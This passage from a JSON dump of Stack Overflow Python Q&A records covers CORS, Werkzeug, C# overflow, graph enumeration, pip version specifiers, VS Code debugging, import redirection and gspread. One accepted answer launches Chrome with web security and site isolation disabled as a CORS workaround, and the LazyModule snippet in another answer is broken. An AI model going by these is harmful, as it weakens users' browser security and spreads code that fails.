app.config['CORS_HEADERS'] = ['Content-Type','Authorization']\n\n\n\n   @app.route(\"/\")\n   def index():\n    \n    return \"Congratulations, it worked\"\n\n   @app.route(\"/signal\", methods = ['POST', 'GET']) #,\n   @cross_origin(origins='http://localhost:57765',headers=['Content-Type','Authorization', \n   'application/x-www-form-urlencoded','*'], upports_credentials=True)# allow all origins all \n   methods.\n   def multbytwo():\n       \"\"\"multiple signal by 2 just to test.\"\"\"\n       global response\n       if (request.method=='POST'):\n       # request.headers.add(\"Access-Control-Allow-Origin\", \"*\")\n           request_data = request.data #getting the response data\n           request_data = json.loads(request_data.decode('utf-8')) #converting it from json to key \n   value pair\n           comingSignal = request_data['signal']\n           response = make_response(comingSignal, 201)#jsonify(comingSignal*2)\n           response.headers.add('Access-Control-Allow-Origin', '*')\n           response.headers.add('Access-Control-Allow-Methods\", \"DELETE, POST, GET, OPTIONS')\n           response.headers.add('Access-Control-Allow-Headers\", \"Content-Type, Authorization, X- \n  Requested-With')\n           return response\n       else:\n           try:\n        #scaler = request.args.get(\"signal\")\n               out = 9 * 2 \n         \n               response = jsonify(out)\n               response.headers.add(\"Access-Control-Allow-Origin\", \"*\") \n               return response #sending data back to your frontend app\n\n           except ValueError:\n               return \"invalid input xyz\"\n\n   if __name__ == \"__main__\":\n       app.run(host=\"127.0.0.1\", port=8080, debug=True)\n\nBelow are the troubleshooting steps I made:\n-Added the flask_CORS package in python\nI tried here different combination from using general parameters like CORS(app, resources={r\"/signal\": {\"origins\": \"*\"}})  did not help. Also tried the decorator @cross-origin and did not help\n-Added some headers to the response itself to indicate that it accepts cross-origin\nYou see in my python code I tried adding a lot of headers to the response, nothing seem to respond.\n-Tried installing an extension in Chrome that by-passes the CORS check\nI tried the allow CORS and CORS unblock extensions and I used the steps described in this answer: How chrome extensions be enabled when flutter web debugging?. Although these extensions are supposed to add the CORS allow header to the response, I still got the same error.\nI still do not fully understand the CORS concept but I tried a lot of work-arounds and nothing works! please help.\n",
    "AcceptedAnswerId": 71882248,
    "AcceptedAnswer": "I finally figured out what was going on.\nFirst I disabled the same origin policy in chrome using this command: this is run clicking the start button in windows and typing this command directly..\nchrome.exe  --disable-site-isolation-trials --disable-web-security --user-data-dir=\"D:\\anything\"\n\nThis fired a separate chrome window that does not block cross-origin, we will call this the CORS free window. This allowed me to finally communicate with my python code and understand what is going on.\n\nYou can see that the chrome default setting were not even showing me anything related to the response, just showing a 500 code error.\nI copied the localhost link and port and pasted them in my other CORS free chrome window\nThe other CORS free chrome window showed helpful information:\n\nIt was a simple JSON decoding error! I went back to my flutter code and I changed the http post request, adding a jsonEncode function on the post body:\nhttp.Response response = await http.post(Uri.parse(url), body:jsonEncode(data), headers: header);\n\nNow the post request returns a correct response on the default chrome settings.\n\nIt was just this CORS blocking the response completely that made me handi-capped.\n"
}
{
    "Id": 72166259,
    "PostTypeId": 1,
    "Title": "Werkzeug server is shutting down in Django application",
    "Body": "after updating the Werkzeug version from 2.0.3 to 2.1.0, I keep getting errors every time I run the server, and here is the error log:\nException happened during processing of request from ('127.0.0.1', 44612)                                                                                                                                  \nTraceback (most recent call last):                                                                                                                                                                         \n  File \"/usr/lib/python3.8/socketserver.py\", line 683, in process_request_thread                                                                                                                           \n    self.finish_request(request, client_address)                                                                                                                                                           \n  File \"/usr/lib/python3.8/socketserver.py\", line 360, in finish_request                                                                                                                                   \n    self.RequestHandlerClass(request, client_address, self)                                                                                                                                                \n  File \"/usr/lib/python3.8/socketserver.py\", line 747, in __init__                                                                                                                                         \n    self.handle()                                                                                                                                                                                          \n  File \"/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/werkzeug/serving.py\", line 363, in handle                                                                                          \n    super().handle()                                                                                                                                                                                       \n  File \"/usr/lib/python3.8/http/server.py\", line 427, in handle                                                                                                                                            \n    self.handle_one_request()                                                                                                                                                                              \n  File \"/usr/lib/python3.8/http/server.py\", line 415, in handle_one_request                                                                                                                                \n    method()                                                                                                                                                                                               \n  File \"/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/werkzeug/serving.py\", line 243, in run_wsgi                                                                                        \n    self.environ = environ = self.make_environ()                                                                                                                                                           \n  File \"/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/django_extensions/management/commands/runserver_plus.py\", line 326, in make_environ                                                \n    del environ['werkzeug.server.shutdown']                                                                                                                                                                \nKeyError: 'werkzeug.server.shutdown'  \n\nthis exception keep appearing while incrementing by 2 ( ('127.0.0.1', 44612) ->  ('127.0.0.1', 44628)  and the server crash\nchecking the changes log, I have found this detail:\nRemove previously deprecated code. #2276\n\nRemove the non-standard shutdown function from the WSGI environ when running the development server. See the docs for alternatives.\n\nhere is the link to the changes log\nit asks to check the documentation for alternatives but can not find any\nplease let me know how I would resolve this error, thank you\nNB: my python version is 3.8\n",
    "AcceptedAnswerId": 72206748,
    "AcceptedAnswer": "Literally just ran into this today. According to their (git repo issue 1715) and assuming you are running runserver_plus, there are three options that worked for some users. The first worked for me:\n\nNot altering your files and adding the option --keep-meta-shutdown. My full command looks like python manage.py runserver_plus --cert-file /path/to/cert.pem --key-file /path/to/key.pem --keep-meta-shutdown localhost:9000\nComment out open lines 325 and 326 under your runserver_plus.py\nUpgrading python to 3.10\n\nHope this helps!\n"
}
{
    "Id": 72782100,
    "PostTypeId": 1,
    "Title": "For loop in c# vs For loop in python",
    "Body": "I was writing a method that would calculate the value of e^x. The way I implemented this in python was as follows.\nimport math\n\ndef exp(x):\n    return sum([\n        x**n/math.factorial(n)\n        for n in range(0, 100)\n    ])\n\nThis would return the value of e^x very well. But when I tried to implement the same method in c#, it didn't output the same value as it did in python. The following was the implementation in c#.\nstatic double exp(int x)\n{\n    double FinalAnswer = 0;\n    for (int j = 0; j <= 100; j++)\n    {\n        FinalAnswer += (Math.Pow(x, j))/Factorial(j);\n    }\n    return FinalAnswer;\n}\n\nThe output for this code was an infinity symbol at first. To resolve this I just reduced the number of times the loop ran. The output of the code in c# where the loop only ran 10 times was pretty close to the output in python where the loop ran 100 times. My question is that what is going on between the two loops in different programming languages. At first I thought that the expression that I was using in my method to calculate e^x was converging quickly. But how does a loop that runs 10 times produce an output that matches the output of a loop that runs 100 times.\nAlso, When I increased the for loop in c# to 20 and 30, the values of e^x for x > 3 were way off. Could someone explain what is going on here?\n",
    "AcceptedAnswerId": 72782395,
    "AcceptedAnswer": "What you're likely running into here is integer overflow with the C# version of the Factorial function (at least your implementation of it, or wherever its coming from).\nIn C#, an int is a numerical type stored in 32 bits of memory, which means it's bounded by -2^31  which is around +/- 2.1 billion. You could try using a long type, which is a 64 bit numerical type, however for even larger upper bounds in your for loop, like getting close to 100, you're going to overflow long as well.\nWhen you run the Factorial function in C#, it starts off normally for the first little while, however if you keep going, you'll see that it all of a sudden jumps into negative numbers, and if you keep going even further than that, it'll get to 0 and stop changing. You're seeing the output of infinity due to division by 0, and C# has a way of handling that with doubles; that being to just return double.PositiveInfinity.\nThe reason why this doesn't happen in python is that it uses a variable number of bits to store its numerical values.\nAdded note: What you might also want to try is using a Factorial function that works with the double type instead of int or long, however by doing this, you'll lose precision on what the exact value is, but you get more range as the magnitude of the number you can store is larger\nFurther Note: As mentioned in the comments, C# has a type called BigInteger which is designed to handle huge numbers like the values you would expect from large inputs to a Factorial function. You can find a reference to the BigInteger docs here\n\nWhat you can do is calculate each component of the factorial function separately with the power you're using. Here's what I mean:\npublic decimal Exp(decimal power, int accuracy = 100)\n{\n    decimal runningTotal = 1;\n    decimal finalValue = 1;\n    for (int i = 1; i <= accuracy; i++)\n    {\n        runningTotal *= power/i;\n        finalValue += runningTotal;\n    }\n    return finalValue;\n}\n\n"
}
{
    "Id": 71671866,
    "PostTypeId": 1,
    "Title": "Python: What is the difference between `lambda` and `lambda_`?",
    "Body": "I know the function of lambda: and lambda var: , but what does lambda_: means acutally?\n",
    "AcceptedAnswerId": 71671890,
    "AcceptedAnswer": "lambda_ is just a variable name, like any other. Like foo or x.\nIf you saw:\nlambda_: Something\n\nThen that is actually a variable annotation, for type hints, so the same as:\nnum: int\nnum = 0\n\n"
}
{
    "Id": 71641609,
    "PostTypeId": 1,
    "Title": "How does CPython implement os.environ?",
    "Body": "I was looking through source and noticed that it references a variable environ in methods before its defined:\ndef _createenviron():\n    if name == 'nt':\n        # Where Env Var Names Must Be UPPERCASE\n        def check_str(value):\n            if not isinstance(value, str):\n                raise TypeError(\"str expected, not %s\" % type(value).__name__)\n            return value\n        encode = check_str\n        decode = str\n        def encodekey(key):\n            return encode(key).upper()\n        data = {}\n        for key, value in environ.items():\n            data[encodekey(key)] = value\n    else:\n        # Where Env Var Names Can Be Mixed Case\n        encoding = sys.getfilesystemencoding()\n        def encode(value):\n            if not isinstance(value, str):\n                raise TypeError(\"str expected, not %s\" % type(value).__name__)\n            return value.encode(encoding, 'surrogateescape')\n        def decode(value):\n            return value.decode(encoding, 'surrogateescape')\n        encodekey = encode\n        data = environ\n    return _Environ(data,\n        encodekey, decode,\n        encode, decode)\n\n# unicode environ\nenviron = _createenviron()\ndel _createenviron\n\nSo how does environ get setup? I cant seem to reason about where its initialized and declared so that _createenviron can use it?\n",
    "AcceptedAnswerId": 71682620,
    "AcceptedAnswer": "TLDR search for from posix import * in os module content.\nThe os module imports all public symbols from posix (Unix) or nt (Windows) low-level module at the beginning of os.py.\nposix exposes environ as a plain Python dict.\nos wraps it with _Environ dict-like object that updates environment variables on _Environ items changing.\n"
}
{
    "Id": 71597789,
    "PostTypeId": 1,
    "Title": "Generate all digraphs of a given size up to isomorphism",
    "Body": "I am trying to generate all directed graphs with a given number of nodes up to graph isomorphism so that I can feed them into another Python program. Here is a naive reference implementation using NetworkX, I would like to speed it up:\nfrom itertools import combinations, product\nimport networkx as nx\n\ndef generate_digraphs(n):\n  graphs_so_far = list()\n  nodes = list(range(n))\n  possible_edges = [(i, j) for i, j in product(nodes, nodes) if i != j]\n  for edge_mask in product([True, False], repeat=len(possible_edges)):\n    edges = [edge for include, edge in zip(edge_mask, possible_edges) if include]\n    g = nx.DiGraph()\n    g.add_nodes_from(nodes)\n    g.add_edges_from(edges)\n    if not any(nx.is_isomorphic(g_before, g) for g_before in graphs_so_far):\n      graphs_so_far.append(g)\n  return graphs_so_far\n\nassert len(generate_digraphs(1)) == 1\nassert len(generate_digraphs(2)) == 3\nassert len(generate_digraphs(3)) == 16\n\nThe number of such graphs seems to grow pretty quickly and is given by this OEIS sequence. I am looking for a solution that is able to generate all graphs up to 7 nodes (about a billion graphs in total) in a reasonable amount of time.\nRepresenting a graph as a NetworkX object is not very important; for example, representing a graph with an adjacency list or using a different library is good with me.\n",
    "AcceptedAnswerId": 71701505,
    "AcceptedAnswer": "There\u2019s a useful idea that I learned from Brendan McKay\u2019s paper\n\u201cIsomorph-free exhaustive generation\u201d (though I believe that it predates\nthat paper).\nThe idea is that we can organize the isomorphism classes into a tree,\nwhere the singleton class with the empty graph is the root, and each\nclass with graphs having n > 0 nodes has a parent class with graphs\nhaving n \u2212 1 nodes. To enumerate the isomorphism classes of graphs with\nn > 0 nodes, enumerate the isomorphism classes of graphs with n \u2212 1\nnodes, and for each such class, extend its representatives in all\npossible ways to n nodes and filter out the ones that aren\u2019t actually\nchildren.\nThe Python code below implements this idea with a rudimentary but\nnontrivial graph isomorphism subroutine. It takes a few minutes for n =\n6 and (estimating here) on the order of a few days for n = 7. For extra\nspeed, port it to C++ and maybe find better algorithms for handling the\npermutation groups (maybe in TAoCP, though most of the graphs have no\nsymmetry, so it\u2019s not clear how big the benefit would be).\nimport cProfile\nimport collections\nimport itertools\nimport random\n\n\n# Returns labels approximating the orbits of graph. Two nodes in the same orbit\n# have the same label, but two nodes in different orbits don't necessarily have\n# different labels.\ndef invariant_labels(graph, n):\n    labels = [1] * n\n    for r in range(2):\n        incoming = [0] * n\n        outgoing = [0] * n\n        for i, j in graph:\n            incoming[j] += labels[i]\n            outgoing[i] += labels[j]\n        for i in range(n):\n            labels[i] = hash((incoming[i], outgoing[i]))\n    return labels\n\n\n# Returns the inverse of perm.\ndef inverse_permutation(perm):\n    n = len(perm)\n    inverse = [None] * n\n    for i in range(n):\n        inverse[perm[i]] = i\n    return inverse\n\n\n# Returns the permutation that sorts by label.\ndef label_sorting_permutation(labels):\n    n = len(labels)\n    return inverse_permutation(sorted(range(n), key=lambda i: labels[i]))\n\n\n# Returns the graph where node i becomes perm[i] .\ndef permuted_graph(perm, graph):\n    perm_graph = [(perm[i], perm[j]) for (i, j) in graph]\n    perm_graph.sort()\n    return perm_graph\n\n\n# Yields each permutation generated by swaps of two consecutive nodes with the\n# same label.\ndef label_stabilizer(labels):\n    n = len(labels)\n    factors = (\n        itertools.permutations(block)\n        for (_, block) in itertools.groupby(range(n), key=lambda i: labels[i])\n    )\n    for subperms in itertools.product(*factors):\n        yield [i for subperm in subperms for i in subperm]\n\n\n# Returns the canonical labeled graph isomorphic to graph.\ndef canonical_graph(graph, n):\n    labels = invariant_labels(graph, n)\n    sorting_perm = label_sorting_permutation(labels)\n    graph = permuted_graph(sorting_perm, graph)\n    labels.sort()\n    return max(\n        (permuted_graph(perm, graph), perm[sorting_perm[n - 1]])\n        for perm in label_stabilizer(labels)\n    )\n\n\n# Returns the list of permutations that stabilize graph.\ndef graph_stabilizer(graph, n):\n    return [\n        perm\n        for perm in label_stabilizer(invariant_labels(graph, n))\n        if permuted_graph(perm, graph) == graph\n    ]\n\n\n# Yields the subsets of range(n) .\ndef power_set(n):\n    for r in range(n + 1):\n        for s in itertools.combinations(range(n), r):\n            yield list(s)\n\n\n# Returns the set where i becomes perm[i] .\ndef permuted_set(perm, s):\n    perm_s = [perm[i] for i in s]\n    perm_s.sort()\n    return perm_s\n\n\n# If s is canonical, returns the list of permutations in group that stabilize s.\n# Otherwise, returns None.\ndef set_stabilizer(s, group):\n    stabilizer = []\n    for perm in group:\n        perm_s = permuted_set(perm, s)\n        if perm_s < s:\n            return None\n        if perm_s == s:\n            stabilizer.append(perm)\n    return stabilizer\n\n\n# Yields one representative of each isomorphism class.\ndef enumerate_graphs(n):\n    assert 0 <= n\n    if 0 == n:\n        yield []\n        return\n    for subgraph in enumerate_graphs(n - 1):\n        sub_stab = graph_stabilizer(subgraph, n - 1)\n        for incoming in power_set(n - 1):\n            in_stab = set_stabilizer(incoming, sub_stab)\n            if not in_stab:\n                continue\n            for outgoing in power_set(n - 1):\n                out_stab = set_stabilizer(outgoing, in_stab)\n                if not out_stab:\n                    continue\n                graph, i_star = canonical_graph(\n                    subgraph\n                    + [(i, n - 1) for i in incoming]\n                    + [(n - 1, j) for j in outgoing],\n                    n,\n                )\n                if i_star == n - 1:\n                    yield graph\n\n\ndef test():\n    print(sum(1 for graph in enumerate_graphs(5)))\n\n\ncProfile.run(\"test()\")\n\n"
}
{
    "Id": 72244046,
    "PostTypeId": 1,
    "Title": "Use >= or ~= for compatibilty across systems?",
    "Body": "My goal is a simple and proper way to export my venv. In the optimal case, the resulting requirements.txt works on all compatible systems.\nAt the moment I use pip freeze > requirements.txt.\nThis uses the == \"Version matching clause\". On an other system the file might not work due to conflicting versions, although it was compatible.\nIn PEP 440 there is also a ~= \"Compatible clause\".  However, I cannot find an option for that in pip freeze docs. Using \"find and replace\" or a tool like awk to replace == with ~= works okay.\nMy naive conclusion is that ~= would be the ideal clause to use in requirements.txt. However, when I look at popular packages they often use >= to specify a version. E.g. at urllib3.\nIs there a drawback to ~=, which I do not see?\nIf that is not the case:\nWhy is >= used in so many packages?\nEdit:\nPigar has an option to use >= natively and there is a comparison to freeze here. Apparently, they also do not use ~=.\nYet, I am still not sure which one to use, as >= could break when there is a major version change. Also packages which are a lower minor version would be marked incompatible, although they should be compatible.\n",
    "AcceptedAnswerId": 72790287,
    "AcceptedAnswer": "Your question is not simple to answer and touches on some nuances in the social dynamics around versioning.\nEasy stuff first: sometimes versions use a terminal suffix to indicate something like prerelease builds, and if you're dependent on a prerelease build or some other situation where you expect the terminal suffix to iterate repeatedly (especially in a non-ordered way), ~= helps you by letting you accept all iterations on a build. PEP 440 contains a good example:\n~= 2.2.post3\n>= 2.2.post3, == 2.*\n\nSecond, pip freeze is not meant to be used to generate a requirements list. It just dumps a list of everything you've currently got, which is far more than actually needs to go in a requirements file. So it makes sense that it would only use ==: for example, it's meant to let you replicate a set of packages to an 'identical' environment elsewhere.\n\nHard stuff next. Under semantic versioning, the only backwards-incompatible revisions should be major revisions. (This depends on how much you trust the maintainer - put a pin in that.) However, if specifying a patch number, ~= won't upgrade to a new minor rev even if one is available and it should, in principle, be backwards-compatible. This is important to talk about clearly, because \"compatible release\" has two different meanings: in semantic versioning, a \"compatible release\" is (colloquially) any rev between this one and the next major rev; in requirements files, a \"compatible release\" is a revision that patches the same terminal rev only.\nLet me be clear now: when I say \"backwards-compatible,\" I mean it in the semantic versioning sense only. (If the package in question doesn\u2019t use semantic versioning, or has a fourth version number, well - generally ~= will still match all patches, but check to be sure.)\nSo, there's a trade to be made between >= and ~=, and it has to do with chains of trust in dependency management. Here are three principles - then after, I'll offer some speculation on why so many package maintainers use >=.\n\nIn general, it's the responsibility of a package maintainer to ensure that all version numbers matching their requirements.txt are compatible with that package, with the occasional exception of deprecated patch revs. This includes ensuring that the requirements.txt is as small as possible and contains only that package's requirements. (More broadly, \u201crequire as little as possible and validate it as much as possible.\u201d)\n\nIn general, no matter the language and no matter the package, dependencies reflect a chain of trust. I am implementing a package; I trust you to maintain your package (and its requirements file) in a way that continues to function. You are trusting your dependencies to maintain their packages in a way that continues to function. In turn, your downstream consumers are expecting you to maintain your package in a way that means it continues to function for them. This is based on human trust. The number is 'just' a convenient communication tool.\n\nIn general, no matter the change set, package maintainers try extremely hard to avoid major versions. No one wants to be the guy who releases a major rev and forces consumers to version their package through a substantial rewrite - or consign their projects to an old and unsupported version. We accept major revs as necessary (that's why we have systems to track them), but folks are typically loath to use them until they really don't have another option.\n\n\nSynthesize these three. From the perspective of a package maintainer, supposing one trusts the maintainers one is dependent upon (as one should), it is broadly speaking more reasonable to expect major revisions to be rare, than it is to expect minor revisions to be backwards-incompatible by accident. This means the number of reactive updates you'll need to make in the >= scheme should be small (but, of course, nonzero).\n\nThat's a lot of groundwork. I know this is long, but this is the good part: the trade.\nFor example, suppose I developed a package, helloworld == 0.7.10. You developed a package atop helloworld == 0.7.10, and then I later rev helloworld to 0.8. Let's start by considering the best case situation: that I am still offering support for the 0.7.10 version and (ex.) patch it to 0.7.11 at a later date, even while maintaining 0.8 separately. This allows your downstream consumers to accept patches without losing compatibility with your package, even when using ~=. And, you are \"guaranteed\" that future patches won't break your current implementation or require maintenance in event of mistakes - I\u2019m doing that work for you. Of course, this only works if I go to the trouble of maintaining both 0.7 and 0.8, but this does seem advantageous...\nSo, why does it break? Well, one example. What happens if you specify helloworld ~= 0.7.10 in your package, but another upstream dependency of yours (that isn't me!) upgrades, and now uses helloworld >= 0.8.1? Since you relied on a minor version's compatibility requirements, there's now a conflict. Worse, what if a consumer of your package wants to use new features from helloworld == 0.8.1 that aren't available in 0.7? They can't.\nBut remember, a semver-compliant package built on helloworld v0.7 should be just fine running on helloworld v0.8 - there should be no breaking changes. It's your specification of ~= that is the most likely to have broken a dependency or consumer need for no good reason - not helloworld.\nIf instead you had used helloworld >= 0.7.10, then you would've allowed for the installation of 0.8, even when your package was not explicitly written using it. If 0.8 doesn't break your implementation, which is supposed to be true, then allowing its use would be the correct manual decision anyway. You don't even necessarily need to know what I'm doing or how I'm writing 0.8, because minor versions should only be adding functionality - functionality you're obviously not using, but someone else might want to.\nThe chain of trust is leaky, though. As the maintainer of helloworld, I might not know for certain whether my revision 0.8 introduces bugs or potential issues that could interfere with the usage of a package originally written for 0.7. Sure, by naming it 0.8 and not 1.0, I claim that I will (and should be expected to!) provide patches to helloworld as needed to address failures to maintain backwards-compatibility. But in practice, that might become untenable, or simply not happen, especially in the very unusual case (joke) where a package does not have rigorous unit and regression tests.\nSo your trade, as a package developer and maintainer, boils down to this: Do you trust me, the maintainer of helloworld, to infrequently release major revs, and to ensure that minor revs do not risk breaking backwards-compatibility, more than you need your downstream consumers to be guaranteed a stable release?\n\nUsing >= means:\n\n(Rare): If I release a major rev, you'll need to update your requirements file to specify which major rev you are referring to.\n(Uncommon): If I release a minor rev, but a bug, review, regression failure, etc. cause that minor rev to break packages built atop old versions, you'll either need to update your requirements file to specify which minor rev you are referring to, or wait for me to patch it further. (What if I decline to patch it further, or worse, take my sweet time doing so?)\n\nUsing ~= means:\n\nIf any of your upstream packages end up using a different minor revision than the one your package was originally built to use, you risk a dependency conflict between you and your upstream providers.\nIf any of your downstream consumers want or need to use features introduced in a later minor revision of a package you depend upon, they can't - not without overriding your requirements file and hoping for the best.\nIf I stop supporting a minor revision of a package you use, and release critical patches on a future minor rev only, you and your consumers won't get them. (What if these are important, ex. security updates? urllib3 could be a great example.)\n\nIf those 'rare' or 'uncommon' events are so disruptive to your project that you just can't conceive of a world in which you'd want to take that risk, use ~=, even at the cost of convenience/security to your downstream consumers. But if you want to give downstream consumers the most flexibility possible, don't mind dealing with the occasional breaking-change event, and want to make sure your own code typically runs on the most recent version it can, using >= is the safer way to go. It's usually the right decision, anyway.\nFor this reason, I expect most maintainers deliberately use >= most of the time. Or maybe it's force of habit. Or maybe I'm just reading too much into it.\n"
}
{
    "Id": 71811731,
    "PostTypeId": 1,
    "Title": "How do you get VS Code to write Debug stdout to the Debug Console?",
    "Body": "I am trying to debug my Python Pytest tests in VS Code, using the Testing Activity on the left bar. I am able to run my tests as expected, with some passing and some failing. I would like to debug the failing tests to more accurately determine what is causing the failures.\nWhen I run an individual test in debug mode VS Code is properly hitting a breakpoint and stopping, and the Run and Debug pane shows the local variables. I can observe the status of local variables either in the Variables > Local pane or through the REPL, by typing the name of the variable.\nWhen I try to print out any statement, such as using > print(\"here\") I do not get any output to the Debug Console. When I reference a variable, or put the string directly using > \"here\" I do see the output to the Debug Console.\nIt seems to me that the stdout of my REPL is not displaying to the Debug Console. A number of answers online have been suggesting to add options like \"redirectOutput\": true or \"console\": \"integratedTerminal\", but neither of those seem to have worked. My full launch.json is below:\n{\n    // Use IntelliSense to learn about possible attributes.\n    // Hover to view descriptions of existing attributes.\n    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Python: Current File\",\n            \"type\": \"python\",\n            \"request\": \"launch\",\n            \"program\": \"${file}\",\n            \"debugOptions\": [\n                \"WaitOnAbnormalExit\",\n                \"WaitOnNormalExit\"\n            ],\n            \"console\": \"integratedTerminal\",\n            \"stopOnEntry\": false,\n            \"redirectOutput\": true,\n            \"outputCapture\": \"std\"\n        }\n    ]\n}\n\nIs there another setting I'm missing to enable this output? Have I got the wrong console type?\n",
    "AcceptedAnswerId": 71888908,
    "AcceptedAnswer": "So After a lot of frustrating \"debugging\" I found a solution that worked for me (if you are using pytest as me):\ntldr\nTwo solutions:\n\ndowngrade your vscode python extension to v2022.2.1924087327 that will do the trick (or any version that had the debugpy).\n\n\nOr, Launch the debbuger from the debug tab not the testing tab. And use a configuration like the following one\n{\n    \"name\": \"Python: Current File (Integrated Terminal)\",\n    \"type\": \"python\",\n    \"request\": \"launch\",\n    \"program\": \"${file}\",\n    \"console\": \"integratedTerminal\",\n    \"purpose\": [\"debug-test\"], \n    \"redirectOutput\": true,\n    \"env\": {\"PYTHONPATH\": \"${workspaceRoot}\"}\n}\n\n\nBonus. If you are using pytest you can temporarily disable the capture of the stdout of pytest  so your print statements, and the print function, *if you breakpoint inside the contextmanager, will work too. This is very cumbersome but points out the original problem of why the prints are not longer working.\ndef test_disabling_capturing(capsys):\n    print('this output is captured')\n    with capsys.disabled():\n        print('output not captured, going directly to sys.stdout')\n    print('this output is also captured')\n\n\n\nthe long explanation\nso the problem apparently is that the debugpy (which is the library used by vscode python debugger) in is last version v1.6.0 fixed this \"bug (827)\". In a nutshell, this \"bug\" was that vscode \"duplicated\" all the stdout when debugging because it captures the pytest stdout and replicate it in the debugger console.\nThis is because, by default, pytest captures all the stdout and store it (so when running all test in parallel it doesn't create a mess).\nAfter \"fixing\" this issue, now, when you launch the test via the testing tab, by default, pytest is capturing all the stdout and the \"new\" (>=v1.6.1) debugpy ignores it. Therefore, all the print statements are not shown anymore on the debug console, even when you call print() in a breakpoint, because are captured by pytest (IDK where the pytest captured stdout is showing/stored if it is anywhere). which, in my case is a PITA.\nYou can disable the pytest capture option using the flag -s or --capture=no when launching pytest in a console or even from the debug tab as a custom configuration. but the problem is that there is no way (apparently) to add these parameters in vscode for the testing tab so pytest is executed using that option.\nTherefore the solution that I found was to downgrade the python extension to a version that uses an older version of debugpy v1.5.1, you can see in the python extension changelog that from the  version 2022.4.0 they update the debugpy version, so going before that did the trick for me, you will have the double stdout \"bug\" in the console, but the print statement will work.\nref: The issue that lead me to the solution\n\nYou may make your voice heard here in the vscode-python issues\n"
}
{
    "Id": 72235819,
    "PostTypeId": 1,
    "Title": "How can I redirect module imports with modern Python?",
    "Body": "I am maintaining a python package in which I did some restructuring. Now, I want to support clients who still do from my_package.old_subpackage.foo import Foo instead of the new from my_package.new_subpackage.foo import Foo, without explicitly reintroducing many files that do the forwarding.  (old_subpackage still exists, but no longer contains foo.py.)\nI have learned that there are \"loaders\" and \"finders\", and my impression was that I should implement a loader for my purpose, but I only managed to implement a finder so far:\nRENAMED_PACKAGES = {\n    'my_package.old_subpackage.foo': 'my_package.new_subpackage.foo',\n}\n\n# TODO: ideally, we would not just implement a \"finder\", but also a \"loader\"\n# (using the importlib.util.module_for_loader decorator); this would enable us\n# to get module contents that also pass identity checks\nclass RenamedFinder:\n\n    @classmethod\n    def find_spec(cls, fullname, path, target=None):\n        renamed = RENAMED_PACKAGES.get(fullname)\n        if renamed is not None:\n            sys.stderr.write(\n                f'WARNING: {fullname} was renamed to {renamed}; please adapt import accordingly!\\n')\n            return importlib.util.find_spec(renamed)\n        return None\n\nsys.meta_path.append(RenamedFinder())\n\nhttps://docs.python.org/3.5/library/importlib.html#importlib.util.module_for_loader and related functionality, however, seem to be deprecated.  I know it's not a very pythonic thing I am trying to achieve, but I would be glad to learn that it's achievable.\n",
    "AcceptedAnswerId": 72244240,
    "AcceptedAnswer": "On import of your package's __init__.py, you can place whatever objects you want into sys.modules, the values you put in there will be returned by import statements:\nfrom . import new_package\nfrom .new_package import module1, module2\nimport sys\n\nsys.modules[\"my_lib.old_package\"] = new_package\nsys.modules[\"my_lib.old_package.module1\"] = module1\nsys.modules[\"my_lib.old_package.module2\"] = module2\n\nIf someone now uses import my_lib.old_package or import my_lib.old_package.module1 they will obtain a reference to my_lib.new_package.module1. Since the import machinery already finds the keys in the sys.modules dictionary, it never even begins looking for the old files.\nIf you want to avoid importing all the submodules immediately, you can emulate a bit of lazy loading by placing a module with a __getattr__ in sys.modules:\nfrom types import ModuleType\nimport importlib\nimport sys\n\nclass LazyModule(ModuleType):\n def __init__(self, name, mod_name):\n  super().__init__(name)\n  self.__mod_name = name\n\n def __getattr__(self, attr):\n  if \"_lazy_module\" not in self.__dict__:\n    self._lazy_module = importlib.import(self.__mod_name, package=\"my_lib\")\n  return self._lazy_module.__getattr__(attr)\n\nsys.modules[\"my_lib.old_package\"] = LazyModule(\"my_lib.old_package\", \"my_lib.new_package\")\n\n"
}
{
    "Id": 71686960,
    "PostTypeId": 1,
    "Title": "TypeError: Credentials need to be from either oauth2client or from google-auth",
    "Body": "I'm new to python and currently is working on a project that requires me to export pandas data frame from google collab to a google spreadsheet with multiple tabs. Previously when I run this specific code, there are no errors but then now it shows an error like this:\n    TypeError                                 Traceback (most recent call last)\n in ()\n      5 gauth.credentials = GoogleCredentials.get_application_default()\n      6 drive = GoogleDrive(gauth)\n----> 7 gc = gspread.authorize(GoogleCredentials.get_application_default())\n\n2 frames\n/usr/local/lib/python3.7/dist-packages/gspread/utils.py in convert_credentials(credentials)\n     59 \n     60     raise TypeError(\n---> 61         'Credentials need to be from either oauth2client or from google-auth.'\n     62     )\n     63 \n\nTypeError: Credentials need to be from either oauth2client or from google-auth.\n\nHere is the code that I use to create authentication.\n#Import PyDrive and associated libraries.\n#This only needs to be done once per notebook.\n\nfrom pydrive.auth import GoogleAuth\nfrom pydrive.drive import GoogleDrive\nfrom google.colab import auth\nfrom oauth2client.client import GoogleCredentials\nimport gspread\n\n#Authenticate and create the PyDrive client.\n#This only needs to be done once per notebook.\nauth.authenticate_user()\ngauth = GoogleAuth()\ngauth.credentials = GoogleCredentials.get_application_default()\ndrive = GoogleDrive(gauth)\ngc = gspread.authorize(GoogleCredentials.get_application_default())\n\nAny help would be much appreciated.\n",
    "AcceptedAnswerId": 71711274,
    "AcceptedAnswer": "I had the same problem today and found this answer: https://github.com/burnash/gspread/issues/1014#issuecomment-1082536016\nI finally solved it by replacing the old code with this one:\nfrom google.colab import auth\nauth.authenticate_user()\n\nimport gspread\nfrom google.auth import default\ncreds, _ = default()\n\ngc = gspread.authorize(creds)\n\n"
}
{
    "Id": 72795799,
    "PostTypeId": 1,
    "Title": "How to solve 403 error with Flask in Python?",
    "Body": "I made a simple server using python flask in mac. Please find below the code.\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef hello():\n    print(\"request received\")\n    return \"Hello world!\"\n\n    \nif __name__ == \"__main__\":\n    app.run(debug=True)\n\nI run it using python3 main.py command.\nWhile calling above API on url  http://localhost:5000/ from Postman using GET / POST method, it always returns http 403 error.\n\nPython version : 3.8.9\nOS : Mac OS 12.4\nFlask : 2.1.2\n\n",
    "AcceptedAnswerId": 72797062,
